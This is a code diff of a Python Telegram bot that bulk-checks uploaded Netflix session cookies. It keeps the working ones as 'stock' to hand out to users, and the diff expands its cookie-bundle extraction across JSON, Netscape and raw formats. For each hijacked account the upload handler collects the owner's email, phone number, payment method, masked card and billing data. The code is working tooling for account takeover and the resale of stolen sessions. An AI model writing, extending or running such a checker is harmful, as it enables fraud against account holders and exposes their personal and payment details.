                 await self._send_message(update, "⚠️ You already have a pending report! Please upload a screenshot first.")
                 return
             
             data = update.callback_query.data if update.callback_query else ""
             account_id = None
-            
             if data.startswith("report_notworking_"):
                 account_id = int(data.split("_")[2])
             else:
@@ -1845,22 +1791,18 @@ class BotHandlers:
             await self._send_message(update, "❌ Error starting report. Please try again.")
     
     async def handle_screenshot(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Handle screenshot upload."""
         try:
             user_id = update.effective_user.id
             user = self.user_repo.get(user_id)
-            
             if user.is_banned:
                 await update.message.reply_text("🚫 You are banned from using this bot.")
                 return
-            
             if not update.message.photo:
                 await update.message.reply_text("❌ Please upload an image/screenshot proof.")
                 return
             
             file_id = update.message.photo[-1].file_id
             
-            # Check admin broadcast
             if is_admin(user_id) and context.user_data.get("waiting_for_broadcast"):
                 await self._handle_broadcast_photo(update, context, file_id)
                 return
@@ -1886,7 +1828,6 @@ class BotHandlers:
                 parse_mode=ParseMode.HTML
             )
             
-            # Send to channel
             if report_type == "working":
                 await self._send_working_to_channel(context.bot, report_id, user_id, account_id, file_id)
             else:
@@ -1898,7 +1839,6 @@ class BotHandlers:
             await update.message.reply_text("❌ Error processing your screenshot. Please try again.")
     
     async def my_status(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Handle my status button."""
         try:
             user_id = update.effective_user.id
             user = self.user_repo.get(user_id)
@@ -1932,7 +1872,6 @@ class BotHandlers:
             
             text += f"\n⏳ <b>Cooldown Period:</b> {WORKING_COOLDOWN_MINUTES} min"
             text += "\n\n👨‍💻 <b>Developer:</b> @Senzo268"
-            
             keyboard = [[InlineKeyboardButton("🔙 Back to Menu", callback_data="back_menu")]]
             await self._send_message(update, text, reply_markup=InlineKeyboardMarkup(keyboard))
         except Exception as e:
@@ -1940,7 +1879,6 @@ class BotHandlers:
             await self._send_message(update, "❌ Error loading status. Please try again.")
     
     async def contact_admin(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Handle contact admin button."""
         try:
             context.user_data["waiting_for_message"] = True
             keyboard = [[InlineKeyboardButton("🔙 Cancel / Back", callback_data="back_menu")]]
@@ -1953,7 +1891,6 @@ class BotHandlers:
             logger.error(f"contact_admin error: {e}")
     
     async def back_to_menu(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Handle back to menu button."""
         try:
             context.user_data.clear()
             await self.start(update, context)
@@ -1961,14 +1898,12 @@ class BotHandlers:
             logger.error(f"back_to_menu error: {e}")
     
     async def stats_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Handle /stats command."""
         try:
             stats = self.account_repo.get_total()
             users = self.user_repo.get_all()
-            
             plan_display = ""
             for plan, count in stats.get('plans', {}).items():
-                emoji = {"PREMIUM": "👑", "STANDARD": "⭐", "BASIC": "🎯", "MOBILE": "📱"}.get(plan.upper(), "📦")
+                emoji = {"premium": "👑", "standard": "⭐", "basic": "🎯", "mobile": "📱"}.get(plan.lower(), "📦")
                 plan_display += f"│ {emoji} {html_escape(plan)}: <b>{count}</b>\n"
             if not plan_display:
                 plan_display = "│ No accounts available\n"
@@ -1994,7 +1929,6 @@ class BotHandlers:
     # ============================================================
     
     async def admin_panel(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Handle admin panel button."""
         try:
             user_id = update.effective_user.id
             if not is_admin(user_id):
@@ -2040,7 +1974,6 @@ class BotHandlers:
             logger.error(f"admin_panel error: {e}")
     
     async def admin_upload(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Handle admin upload button."""
         try:
             user_id = update.effective_user.id
             if not is_admin(user_id):
@@ -2052,7 +1985,9 @@ class BotHandlers:
                 update,
                 f"📤 <b>UPLOAD STOCK FILE</b>\n\n"
                 "Please send a <b>.txt</b>, <b>.json</b>, or <b>.zip</b> file containing Netflix cookie credentials.\n\n"
-                f"⚡ <i>Supports multi-thread checking ({MAX_CHECK_THREADS} threads) & auto-extracting zip files!</i>\n\n"
+                f"⚡ <i>Advanced multi-format extraction with {MAX_CHECK_THREADS} threads!</i>\n"
+                "📋 Supports: JSON, Netscape, Raw regex extraction\n"
+                "🔄 Auto-detects multiple cookie bundles per file\n\n"
                 "👨‍💻 <b>Developer:</b> @Senzo268",
                 reply_markup=InlineKeyboardMarkup(keyboard)
             )
@@ -2061,13 +1996,11 @@ class BotHandlers:
             logger.error(f"admin_upload error: {e}")
     
     async def handle_file_upload(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Handle file upload for stock."""
         try:
             user_id = update.effective_user.id
             if not is_admin(user_id):
                 await update.message.reply_text("⛔ Not authorized!")
                 return
-            
             if not context.user_data.get("waiting_for_upload"):
                 return
             
@@ -2081,12 +2014,12 @@ class BotHandlers:
                 await update.message.reply_text("❌ Supported formats are .txt, .json, .zip, .netscape, .cookies")
                 return
             
-            status_msg = await update.message.reply_text(f"⏳ Downloading <b>{html_escape(file_name)}</b>...", parse_mode=ParseMode.HTML)
+            status_msg = await update.message.reply_text(f"⏳ Processing <b>{html_escape(file_name)}</b> with advanced extraction...", parse_mode=ParseMode.HTML)
             
             file = await context.bot.get_file(document.file_id)
             file_bytes = await file.download_as_bytearray()
             
-            cookie_pairs = []
+            cookie_bundles = []
             
             if file_name.lower().endswith('.zip'):
                 try:
@@ -2096,8 +2029,8 @@ class BotHandlers:
                                 try:
                                     content_bytes = zf.read(zip_info.filename)
                                     text_content = content_bytes.decode('utf-8', errors='ignore')
-                                    pairs = NetflixService.extract_cookie_pairs(text_content)
-                                    cookie_pairs.extend(pairs)
+                                    bundles = NetflixService.extract_cookie_bundles(text_content)
+                                    cookie_bundles.extend(bundles)
                                 except Exception:
                                     pass
                 except Exception as e:
@@ -2106,71 +2039,78 @@ class BotHandlers:
                     return
             else:
                 text_content = file_bytes.decode('utf-8', errors='ignore')
-                cookie_pairs = NetflixService.extract_cookie_pairs(text_content)
+                cookie_bundles = NetflixService.extract_cookie_bundles(text_content)
             
-            if not cookie_pairs:
+            if not cookie_bundles:
                 await status_msg.edit_text("❌ No valid Netflix cookie pairs found in uploaded file.")
                 context.user_data["waiting_for_upload"] = False
                 return
             
-            total = len(cookie_pairs)
+            total = len(cookie_bundles)
             await status_msg.edit_text(
-                f"🔄 Found <b>{total}</b> cookies. Starting multi-threaded check with {MAX_CHECK_THREADS} threads...",
+                f"🔄 Found <b>{total}</b> cookie bundles. Starting multi-threaded check with {MAX_CHECK_THREADS} threads...",
                 parse_mode=ParseMode.HTML
             )
             
             valid = 0
             accounts = []
             account_lock = threading.Lock()
+            processed = 0
             
-            def check_item(item):
-                nid, sid = item
-                cdict = {"NetflixId": nid}
-                if sid:
-                    cdict["SecureNetflixId"] = sid
-                return NetflixService.check_account(cdict)
+            def check_bundle(bundle):
+                cookies_dict = bundle.get("cookies", {})
+                return NetflixService.check_account(cookies_dict)
             
             loop = asyncio.get_running_loop()
             
             with ThreadPoolExecutor(max_workers=MAX_CHECK_THREADS) as executor:
-                futures = [loop.run_in_executor(executor, check_item, item) for item in cookie_pairs]
-                completed = 0
+                futures = [loop.run_in_executor(executor, check_bundle, bundle) for bundle in cookie_bundles]
                 for future in asyncio.as_completed(futures):
-                    completed += 1
+                    processed += 1
                     result = await future
+                    
                     if result.get("valid") and result.get("subscribed"):
-                        nid, sid = cookie_pairs[completed - 1]
-                        cookie_text = NetflixService.get_cookie_text(nid, sid)
+                        info = result.get("info", {})
+                        bundle_index = processed - 1
+                        bundle = cookie_bundles[bundle_index] if bundle_index < len(cookie_bundles) else {}
+                        cookies_dict = bundle.get("cookies", {})
+                        cookie_text = NetflixService.get_cookie_text(cookies_dict)
+                        nftoken = result.get("nftoken")
+                        nftoken_expiry = result.get("nftoken_expiry")
+                        
                         with account_lock:
                             accounts.append({
-                                "email": safe_str(result.get("email")),
-                                "country": safe_str(result.get("country")),
-                                "plan": safe_str(result.get("plan_label", "Unknown")),
+                                "email": safe_str(info.get("email")),
+                                "country": safe_str(info.get("countryOfSignup")),
+                                "plan": safe_str(info.get("localizedPlanName")),
+                                "plan_key": result.get("plan_key", "unknown"),
+                                "plan_label": result.get("plan_label", "Unknown"),
                                 "cookies": cookie_text,
-                                "nftoken": safe_str(result.get("nftoken")),
-                                "nftoken_expiry": safe_str(result.get("nftoken_expiry")),
+                                "nftoken": safe_str(nftoken),
+                                "nftoken_expiry": safe_str(nftoken_expiry),
                                 "source_file": file_name,
-                                "account_name": safe_str(result.get("name")),
-                                "streams": safe_int(result.get("streams")),
-                                "quality": safe_str(result.get("quality")),
-                                "price": safe_str(result.get("price")),
-                                "billing_date": safe_str(result.get("billing_date")),
-                                "member_since": safe_str(result.get("member_since")),
-                                "payment_method": safe_str(result.get("payment_method")),
-                                "card_last4": safe_str(result.get("card_last4")),
-                                "phone": safe_str(result.get("phone")),
-                                "extra_member": safe_bool(result.get("extra_member")),
-                                "membership_status": safe_str(result.get("membership_status")),
-                                "email_verified": safe_bool(result.get("email_verified")),
-                                "profiles": safe_str(result.get("profiles")),
-                                "user_guid": safe_str(result.get("user_guid")),
+                                "account_name": safe_str(info.get("accountOwnerName")),
+                                "streams": safe_int(info.get("maxStreams")),
+                                "quality": safe_str(info.get("videoQuality")),
+                                "price": safe_str(info.get("planPrice")),
+                                "billing_date": safe_str(info.get("nextBillingDate")),
+                                "member_since": safe_str(info.get("memberSince")),
+                                "payment_method": safe_str(info.get("paymentMethodType")),
+                                "card_last4": safe_str(info.get("maskedCard")),
+                                "phone": safe_str(info.get("phoneNumber")),
+                                "extra_member": safe_bool(info.get("extra_member")),
+                                "membership_status": safe_str(info.get("membershipStatus")),
+                                "email_verified": safe_bool(info.get("emailVerified")),
+                                "profiles": safe_str(info.get("profilesDisplay")),
+                                "user_guid": safe_str(info.get("userGuid")),
+                                "on_hold": result.get("on_hold", False),
                             })
                             valid += 1
                     
-                    if completed % 5 == 0 or completed == total:
+                    if processed % 5 == 0 or processed == total:
                         try:
                             await status_msg.edit_text(
-                                f"🔄 Progress: <b>{completed}/{total}</b> | ✅ Valid: <b>{valid}</b> | 💾 Found: <b>{len(accounts)}</b>",
+                                f"🔄 Progress: <b>{processed}/{total}</b> | ✅ Valid: <b>{valid}</b> | 💾 Found: <b>{len(accounts)}</b>",
                                 parse_mode=ParseMode.HTML
                             )
                         except Exception:
@@ -2179,14 +2119,17 @@ class BotHandlers:
             if accounts:
                 saved = self.account_repo.save_batch(accounts)
                 self.stats_repo.log_stock(user_id, file_name, total, saved)
+                stats = self.account_repo.get_total()
                 await status_msg.edit_text(
                     f"✅ <b>STOCK UPLOAD COMPLETE!</b>\n\n"
                     f"📁 <b>File:</b> {html_escape(file_name)}\n"
-                    f"🔍 <b>Found:</b> {total}\n"
+                    f"🔍 <b>Bundles Found:</b> {total}\n"
                     f"✅ <b>Valid Subscribed:</b> {valid}\n"
                     f"💾 <b>Saved to DB:</b> {saved}\n"
-                    f"📊 <b>Available Now:</b> {self.account_repo.get_total().get('total', 0)}\n\n"
-                    f"👨‍💻 <b>Developer:</b> @Senzo268",
+                    f"📊 <b>Available Now:</b> {stats.get('total', 0)}\n"
+                    f"📋 <b>Plan Breakdown:</b>\n"
+                    + "\n".join([f"   ▫️ {plan}: {count}" for plan, count in stats.get('plans', {}).items()])
+                    + f"\n\n👨‍💻 <b>Developer:</b> @Senzo268",
                     parse_mode=ParseMode.HTML
                 )
             else:
@@ -2194,7 +2137,11 @@ class BotHandlers:
                 await status_msg.edit_text(
                     f"❌ <b>NO VALID ACTIVE ACCOUNTS FOUND!</b>\n\n"
                     f"📁 <b>File:</b> {html_escape(file_name)}\n"
-                    f"🔍 <b>Total Checked:</b> {total}\n\n"
+                    f"🔍 <b>Bundles Checked:</b> {total}\n\n"
+                    f"💡 Try:\n"
+                    f"• Ensure cookies contain NetflixId\n"
+                    f"• Check if cookies are from active accounts\n"
+                    f"• Try different format (JSON, Netscape)\n\n"
                     f"👨‍💻 <b>Developer:</b> @Senzo268",
                     parse_mode=ParseMode.HTML
                 )
@@ -2202,11 +2149,11 @@ class BotHandlers:
             context.user_data["waiting_for_upload"] = False
         except Exception as e:
             logger.error(f"handle_file_upload error: {e}")
+            traceback.print_exc()
             context.user_data["waiting_for_upload"] = False
             await update.message.reply_text("❌ Error processing file. Please try again.")
     
     async def admin_stock_mgr(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Handle stock manager."""
         try:
             user_id = update.effective_user.id
             if not is_admin(user_id):
@@ -2224,7 +2171,7 @@ class BotHandlers:
             stats = self.account_repo.get_total()
             
             if plan_filter:
-                accounts = [a for a in accounts if a.plan.upper() == plan_filter.upper()]
+                accounts = [a for a in accounts if a.plan_key.lower() == plan_filter.lower()]
             
             text = f"""📦 <b>ACCOUNT STOCK MANAGER</b>
 ━━━━━━━━━━━━━━━━━━━━━
@@ -2236,9 +2183,9 @@ Showing: <b>{len(accounts)}</b> accounts
             keyboard = [
                 [
                     InlineKeyboardButton("All", callback_data="sm_filter_ALL"),
-                    InlineKeyboardButton("👑 Premium", callback_data="sm_filter_PREMIUM"),
-                    InlineKeyboardButton("⭐ Standard", callback_data="sm_filter_STANDARD"),
-                    InlineKeyboardButton("🎯 Basic", callback_data="sm_filter_BASIC"),
+                    InlineKeyboardButton("👑 Premium", callback_data="sm_filter_premium"),
+                    InlineKeyboardButton("⭐ Standard", callback_data="sm_filter_standard"),
+                    InlineKeyboardButton("🎯 Basic", callback_data="sm_filter_basic"),
                 ]
             ]
             
@@ -2258,7 +2205,6 @@ Showing: <b>{len(accounts)}</b> accounts
             logger.error(f"admin_stock_mgr error: {e}")
     
     async def delete_account_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Handle delete account callback."""
         try:
             query = update.callback_query
             await query.answer()
@@ -2280,7 +2226,6 @@ Showing: <b>{len(accounts)}</b> accounts
             logger.error(f"delete_account_callback error: {e}")
     
     async def admin_users(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Handle admin users button."""
         try:
             user_id = update.effective_user.id
             if not is_admin(user_id):
@@ -2303,7 +2248,6 @@ Showing: <b>{len(accounts)}</b> accounts
             logger.error(f"admin_users error: {e}")
     
     async def manage_user_detail(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Handle manage user detail."""
         try:
             user_id = update.effective_user.id
             if not is_admin(user_id):
@@ -2331,7 +2275,6 @@ Username: @{html_escape(user.username)}
             else:
                 keyboard.append([InlineKeyboardButton("🚫 Ban User", callback_data=f"admin_ban_{target_uid}")])
                 keyboard.append([InlineKeyboardButton("⚠️ Warn User (+1)", callback_data=f"admin_warn_{target_uid}")])
-            
             keyboard.append([InlineKeyboardButton("🔄 Reset Limits", callback_data=f"reset_user_{target_uid}")])
             keyboard.append([InlineKeyboardButton("🔙 Back to Users", callback_data="admin_users")])
             
@@ -2340,7 +2283,6 @@ Username: @{html_escape(user.username)}
             logger.error(f"manage_user_detail error: {e}")
     
     async def admin_user_search_prompt(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Handle user search prompt."""
         try:
             user_id = update.effective_user.id
             if not is_admin(user_id):
@@ -2359,7 +2301,6 @@ Username: @{html_escape(user.username)}
             logger.error(f"admin_user_search_prompt error: {e}")
     
     async def admin_banned(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Handle banned users list."""
         try:
             user_id = update.effective_user.id
             if not is_admin(user_id):
@@ -2375,7 +2316,6 @@ Username: @{html_escape(user.username)}
                 for uid, uname, fname in banned[:20]:
                     text += f"▫️ <b>{html_escape(fname)}</b> (@{html_escape(uname)}) - ID: <code>{uid}</code>\n"
                     keyboard.append([InlineKeyboardButton(f"🔓 Unban {uid}", callback_data=f"unban_user_{uid}")])
-            
             text += "\n👨‍💻 <b>Developer:</b> @Senzo268"
             keyboard.append([InlineKeyboardButton("🔙 Back to Admin", callback_data="admin_panel")])
             await self._send_message(update, text, reply_markup=InlineKeyboardMarkup(keyboard))
@@ -2383,14 +2323,12 @@ Username: @{html_escape(user.username)}
             logger.error(f"admin_banned error: {e}")
     
     async def unban_user_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Handle unban user callback."""
         try:
             query = update.callback_query
             await query.answer()
             user_id = query.from_user.id
             if not is_admin(user_id):
                 return
-            
             data = query.data
             parts = data.split("_")
             if len(parts) >= 3:
@@ -2402,14 +2340,12 @@ Username: @{html_escape(user.username)}
             logger.error(f"unban_user_callback error: {e}")
     
     async def admin_user_actions_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Handle admin user actions."""
         try:
             query = update.callback_query
             await query.answer()
             admin_id = query.from_user.id
             if not is_admin(admin_id):
                 return
-            
             data = query.data
             parts = data.split("_")
             action = parts[0] + "_" + parts[1]
@@ -2425,19 +2361,16 @@ Username: @{html_escape(user.username)}
                 self.db.execute_turso('UPDATE users SET accounts_used = 0, last_account_time = NULL WHERE user_id = ?', (target_uid,))
                 self.db.commit_turso()
                 await query.answer("🔄 User limits reset!")
-            
             await self.manage_user_detail(update, context)
         except Exception as e:
             logger.error(f"admin_user_actions_callback error: {e}")
     
     async def admin_broadcast(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Handle broadcast button."""
         try:
             user_id = update.effective_user.id
             if not is_admin(user_id):
                 await self._send_message(update, "⛔ Not authorized!")
                 return
-            
             keyboard = [[InlineKeyboardButton("🔙 Cancel", callback_data="admin_panel")]]
             users = self.user_repo.get_all()
             await self._send_message(
@@ -2453,17 +2386,14 @@ Username: @{html_escape(user.username)}
             logger.error(f"admin_broadcast error: {e}")
     
     async def _handle_broadcast_photo(self, update: Update, context: ContextTypes.DEFAULT_TYPE, file_id: str):
-        """Handle photo broadcast."""
         try:
             context.user_data["waiting_for_broadcast"] = False
             users = self.user_repo.get_all()
             active_users = [u for u in users if not u.is_banned]
             total_u = len(active_users)
             caption = update.message.caption or ""
-            
             status_msg = await update.message.reply_text(f"🚀 Broadcasting photo to <b>{total_u}</b> users...", parse_mode=ParseMode.HTML)
             success, failed = 0, 0
-            
             for u in active_users:
                 try:
                     await context.bot.send_photo(u.user_id, photo=file_id, caption=caption, parse_mode=ParseMode.HTML)
@@ -2471,7 +2401,6 @@ Username: @{html_escape(user.username)}
                 except Exception:
                     failed += 1
                 await asyncio.sleep(0.05)
-            
             await status_msg.edit_text(
                 f"✅ <b>PHOTO BROADCAST COMPLETE!</b>\n\n"
                 f"👥 Total Users: <b>{total_u}</b>\n"
@@ -2483,26 +2412,20 @@ Username: @{html_escape(user.username)}
             logger.error(f"_handle_broadcast_photo error: {e}")
     
     async def admin_reports(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Handle admin reports button."""
         try:
             user_id = update.effective_user.id
             if not is_admin(user_id):
                 await self._send_message(update, "⛔ Not authorized!")
                 return
-            
             reports = self.report_repo.get_pending()
             keyboard = []
             text = "📋 <b>PENDING USER REPORTS</b>\n\n"
-            
             if not reports:
                 text += "<i>No pending reports right now.</i>\n"
             else:
                 for rep in reports[:10]:
                     text += f"▫️ <b>Report #{rep['id']}</b> | Type: {rep['report_type'].upper()} | User: @{html_escape(rep['username'])} (ID: <code>{rep['user_id']}</code>)\n"
-                    keyboard.append([
-                        InlineKeyboardButton(f"🔍 View #{rep['id']}", callback_data=f"view_rep_{rep['id']}")
-                    ])
-            
+                    keyboard.append([InlineKeyboardButton(f"🔍 View #{rep['id']}", callback_data=f"view_rep_{rep['id']}")])
             text += "\n👨‍💻 <b>Developer:</b> @Senzo268"
             keyboard.append([InlineKeyboardButton("🔙 Back to Admin", callback_data="admin_panel")])
             await self._send_message(update, text, reply_markup=InlineKeyboardMarkup(keyboard))
@@ -2510,45 +2433,39 @@ Username: @{html_escape(user.username)}
             logger.error(f"admin_reports error: {e}")
     
     async def view_report_detail(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Handle view report detail."""
         try:
             user_id = update.effective_user.id
             if not is_admin(user_id):
                 return
-            
             query = update.callback_query
             rep_id = int(query.data.split("_")[2])
             report = self.report_repo.get_by_id(rep_id)
-            
             if not report:
                 await self._send_message(update, "Report not found!")
                 return
-            
-            user = self.user_repo.get(report.user_id)
-            account = self.account_repo.get_assigned(report.user_id)
-            
-            text = f"""📋 <b>REPORT #{report.id} DETAILS</b>
+            user = self.user_repo.get(report["user_id"])
+            account = self.account_repo.get_assigned(report["user_id"])
+            text = f"""📋 <b>REPORT #{report['id']} DETAILS</b>
 
 ━━━━━━━━━━━━━━━━━━━━━
 👤 <b>User:</b> @{html_escape(user.username)} (ID: <code>{user.user_id}</code>)
 📧 <b>Account Email:</b> <code>{html_escape(account.email if account else 'Unknown')}</code>
-🎯 <b>Reported Status:</b> {report.report_type.upper()}
-📅 <b>Timestamp:</b> {html_escape(report.reported_at)}
+🎯 <b>Reported Status:</b> {report['report_type'].upper()}
+📅 <b>Timestamp:</b> {html_escape(report['reported_at'])}
 ━━━━━━━━━━━━━━━━━━━━━
 """
             keyboard = [
-                [InlineKeyboardButton("✅ Confirm Working", callback_data=f"confirm_working_{report.id}_{report.account_id}")],
-                [InlineKeyboardButton("⚠️ Warn User", callback_data=f"warn_user_{report.id}_{report.account_id}_{user.user_id}"), 
-                 InlineKeyboardButton("🚫 Ban User", callback_data=f"ban_user_{report.id}_{report.account_id}_{user.user_id}")],
-                [InlineKeyboardButton("❌ Dismiss Report", callback_data=f"dismiss_report_{report.id}_{report.account_id}")],
+                [InlineKeyboardButton("✅ Confirm Working", callback_data=f"confirm_working_{report['id']}_{report['account_id']}")],
+                [InlineKeyboardButton("⚠️ Warn User", callback_data=f"warn_user_{report['id']}_{report['account_id']}_{user.user_id}"), 
+                 InlineKeyboardButton("🚫 Ban User", callback_data=f"ban_user_{report['id']}_{report['account_id']}_{user.user_id}")],
+                [InlineKeyboardButton("❌ Dismiss Report", callback_data=f"dismiss_report_{report['id']}_{report['account_id']}")],
                 [InlineKeyboardButton("🔙 Back to Reports", callback_data="admin_reports")]
             ]
-            
-            if report.screenshot_file_id:
+            if report['screenshot_file_id']:
                 try:
                     await context.bot.send_photo(
                         chat_id=update.effective_chat.id,
-                        photo=report.screenshot_file_id,
+                        photo=report['screenshot_file_id'],
                         caption=text,
                         reply_markup=InlineKeyboardMarkup(keyboard),
                         parse_mode=ParseMode.HTML
@@ -2556,22 +2473,18 @@ Username: @{html_escape(user.username)}
                     return
                 except Exception:
                     pass
-            
             await self._send_message(update, text, reply_markup=InlineKeyboardMarkup(keyboard))
         except Exception as e:
             logger.error(f"view_report_detail error: {e}")
     
     async def admin_channels(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Handle admin channels button."""
         try:
             user_id = update.effective_user.id
             if not is_admin(user_id):
                 await self._send_message(update, "⛔ Not authorized!")
                 return
-            
             cur = self.db.execute_turso('SELECT id, channel_id, channel_name, invite_link, is_active FROM channels')
             channels = cur.fetchall()
-            
             text = f"""⚙️ <b>CHANNEL MANAGEMENT</b>
 ━━━━━━━━━━━━━━━━━━━━━
 📢 <b>Report Channel ID:</b> <code>{REPORT_CHANNEL_ID if REPORT_CHANNEL_ID else 'NOT SET'}</code>
@@ -2586,7 +2499,6 @@ Username: @{html_escape(user.username)}
                     status = "🟢 Active" if ch[4] else "🔴 Inactive"
                     text += f"▫️ <b>{html_escape(ch[2])}</b> (<code>{html_escape(ch[1])}</code>) | {status}\n"
                     keyboard.append([InlineKeyboardButton(f"❌ Remove {html_escape(ch[2])}", callback_data=f"del_channel_{ch[0]}")])
-            
             text += "\n👨‍💻 <b>Developer:</b> @Senzo268"
             keyboard.append([InlineKeyboardButton("➕ Add Required Channel", callback_data="add_channel_prompt")])
             keyboard.append([InlineKeyboardButton("🔙 Back to Admin", callback_data="admin_panel")])
@@ -2595,7 +2507,6 @@ Username: @{html_escape(user.username)}
             logger.error(f"admin_channels error: {e}")
     
     async def add_channel_prompt(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Handle add channel prompt."""
         try:
             context.user_data["waiting_for_channel"] = True
             keyboard = [[InlineKeyboardButton("🔙 Cancel", callback_data="admin_channels")]]
@@ -2613,7 +2524,6 @@ Username: @{html_escape(user.username)}
             logger.error(f"add_channel_prompt error: {e}")
     
     async def del_channel_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Handle delete channel callback."""
         try:
             query = update.callback_query
             await query.answer()
@@ -2626,13 +2536,11 @@ Username: @{html_escape(user.username)}
             logger.error(f"del_channel_callback error: {e}")
     
     async def admin_stock_logs(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Handle stock logs button."""
         try:
             user_id = update.effective_user.id
             if not is_admin(user_id):
                 await self._send_message(update, "⛔ Not authorized!")
                 return
-            
             logs = self.stats_repo.get_stock_logs()
             text = "📊 <b>STOCK UPLOAD LOGS</b>\n\n"
             if not logs:
@@ -2640,7 +2548,6 @@ Username: @{html_escape(user.username)}
             else:
                 for l in logs:
                     text += f"▫️ <b>{html_escape(l['file_name'])}</b>\n   └ Found: {l['total']} | Valid: {l['valid']} | Admin: {l['admin_id']} | {html_escape(l['time'])}\n"
-            
             text += "\n👨‍💻 <b>Developer:</b> @Senzo268"
             keyboard = [[InlineKeyboardButton("🔙 Back to Admin", callback_data="admin_panel")]]
             await self._send_message(update, text, reply_markup=InlineKeyboardMarkup(keyboard))
@@ -2648,23 +2555,18 @@ Username: @{html_escape(user.username)}
             logger.error(f"admin_stock_logs error: {e}")
     
     async def admin_dashboard(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Handle dashboard button."""
         try:
             user_id = update.effective_user.id
             if not is_admin(user_id):
                 await self._send_message(update, "⛔ Not authorized!")
                 return
-            
             stats = self.account_repo.get_total()
             users = self.user_repo.get_all()
             banned = self.user_repo.get_banned()
             today = self.stats_repo.get_today()
-            
             pending = self.report_repo.get_pending()
-            
             cur = self.db.execute_turso('SELECT COUNT(*) FROM channels WHERE is_active = 1')
             channels = cur.fetchone()[0] or 0
-            
             text = f"""📈 <b>SYSTEM DASHBOARD</b>
 ━━━━━━━━━━━━━━━━━━━━━
 📊 <b>STOCK</b>
@@ -2672,8 +2574,8 @@ Username: @{html_escape(user.username)}
 │ 📦 Available: <b>{stats.get('total', 0)}</b>
 """
             for plan, count in stats.get('plans', {}).items():
-                text += f"│ ▫️ {html_escape(plan)}: <b>{count}</b>\n"
-            
+                emoji = {"premium": "👑", "standard": "⭐", "basic": "🎯", "mobile": "📱"}.get(plan.lower(), "📦")
+                text += f"│ {emoji} {html_escape(plan)}: <b>{count}</b>\n"
             text += f"""└─────────────────────
 👥 <b>USERS</b>
 ┌─────────────────────
@@ -2709,237 +2611,34 @@ Username: @{html_escape(user.username)}
             logger.error(f"admin_dashboard error: {e}")
     
     # ============================================================
-    # CHANNEL CALLBACK HANDLERS
-    # ============================================================
-    
-    async def confirm_working_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Handle confirm working callback from channel."""
-        try:
-            query = update.callback_query
-            await query.answer()
-            data = query.data
-            parts = data.split("_")
-            if len(parts) < 4:
-                return
-            
-            report_id = int(parts[2])
-            account_id = int(parts[3])
-            admin_id = query.from_user.id
-            
-            if not is_admin(admin_id):
-                await query.answer("⛔ Not authorized!", show_alert=True)
-                return
-            
-            self.db.execute_sqlite('UPDATE accounts SET is_working = 1, status = "available", working_confirmed = 1 WHERE id = ?', (account_id,))
-            self.db.commit_sqlite()
-            
-            self.report_repo.update_status(report_id, "accepted", admin_id)
-            
-            current_caption = query.message.caption or query.message.text or ""
-            await query.edit_message_caption(
-                caption=current_caption + "\n\n✅ <b>CONFIRMED WORKING by Admin!</b>",
-                parse_mode=ParseMode.HTML
-            )
-            await query.answer("✅ Account confirmed working!")
-            
-            report = self.report_repo.get_by_id(report_id)
-            if report:
-                try:
-                    await context.bot.send_message(
-                        report.user_id,
-                        f"✅ <b>Your report #{report_id} has been CONFIRMED!</b>\n\n"
-                        f"🎉 Account is working. Thank you for your feedback!\n\n"
-                        f"👨‍💻 <b>Developer:</b> @Senzo268",
-                        parse_mode=ParseMode.HTML
-                    )
-                except Exception:
-                    pass
-        except Exception as e:
-            logger.error(f"confirm_working_callback error: {e}")
-    
-    async def ban_user_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Handle ban user callback from channel."""
-        try:
-            query = update.callback_query
-            await query.answer()
-            data = query.data
-            parts = data.split("_")
-            if len(parts) < 5:
-                return
-            
-            report_id = int(parts[2])
-            account_id = int(parts[3])
-            user_id = int(parts[4])
-            admin_id = query.from_user.id
-            
-            if not is_admin(admin_id):
-                await query.answer("⛔ Not authorized!", show_alert=True)
-                return
-            
-            self.user_repo.ban(user_id, admin_id, "False report (Not Working)")
-            self.account_repo.delete(account_id)
-            self.report_repo.update_status(report_id, "accepted", admin_id)
-            
-            current_caption = query.message.caption or query.message.text or ""
-            await query.edit_message_caption(
-                caption=current_caption + "\n\n✅ <b>USER BANNED & ACCOUNT REMOVED!</b>",
-                parse_mode=ParseMode.HTML
-            )
-            await query.answer("✅ User banned and account removed!")
-            
-            try:
-                await context.bot.send_message(
-                    user_id,
-                    f"🚫 <b>You have been BANNED from this bot!</b>\n\n"
-                    f"Reason: False report (Not Working)\n"
-                    f"Report ID: #{report_id}\n\n"
-                    f"👨‍💻 <b>Developer:</b> @Senzo268",
-                    parse_mode=ParseMode.HTML
-                )
-            except Exception:
-                pass
-        except Exception as e:
-            logger.error(f"ban_user_callback error: {e}")
-    
-    async def warn_user_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Handle warn user callback from channel."""
-        try:
-            query = update.callback_query
-            await query.answer()
-            data = query.data
-            parts = data.split("_")
-            if len(parts) < 5:
-                return
-            
-            report_id = int(parts[2])
-            account_id = int(parts[3])
